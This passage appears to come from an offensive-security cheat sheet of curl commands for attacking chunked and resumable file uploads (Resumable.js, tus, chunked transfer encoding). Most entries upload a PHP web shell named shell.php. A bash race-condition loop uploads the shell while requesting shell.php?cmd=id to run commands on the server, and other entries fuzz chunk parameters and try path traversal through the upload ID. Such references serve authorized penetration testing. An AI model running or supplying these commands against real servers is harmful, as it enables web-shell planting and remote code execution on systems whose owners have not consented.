  `curl -X POST 'URL?resumableChunkNumber=1&resumableTotalChunks=2&resumableFilename=shell.php&resumableIdentifier=abc123' -F 'file=@chunk.bin'`
  :::

  :::field{name="tus create upload" type="command"}
  `curl -X POST URL -H 'Tus-Resumable: 1.0.0' -H 'Upload-Length: SIZE' -H 'Upload-Metadata: filename shell.php'`
  :::

  :::field{name="tus patch chunk" type="command"}
  `curl -X PATCH UPLOAD_URL -H 'Tus-Resumable: 1.0.0' -H 'Upload-Offset: 0' -H 'Content-Type: application/offset+octet-stream' --data-binary @chunk.bin`
  :::

  :::field{name="Chunked TE upload" type="command"}
  `curl -X POST URL -H 'Transfer-Encoding: chunked' -H 'Content-Type: multipart/form-data; boundary=B' -d @chunked_body.bin`
  :::

  :::field{name="Detect chunk protocol" type="command"}
  `curl -s TARGET | grep -ioE 'plupload|resumable|dropzone|tus|filepond|chunkSize|chunk_size'`
  :::

  :::field{name="Detect tus support" type="command"}
  `curl -sI -X OPTIONS URL | grep -i 'tus-resumable\|tus-version'`
  :::

  :::field{name="Race condition (bash)" type="command"}
  `for i in $(seq 1 100); do curl -s URL/shell.php?cmd=id & curl -X POST UPLOAD -F 'file=@shell.php' & done; wait`
  :::

  :::field{name="Chunk param fuzz" type="command"}
  `for idx in -1 0 1 99 NaN null; do curl -s -o /dev/null -w "[%{http_code}] chunk=${idx}\n" 'URL?chunk='$idx'&chunks=1&name=t.php' -F 'file=@s.txt'; done`
  :::

  :::field{name="Upload ID path traversal" type="command"}
  `curl -X POST 'URL?uploadId=../../../shell&chunk=0&chunks=1&name=shell.php' -F 'file=@shell.txt'`
  :::
::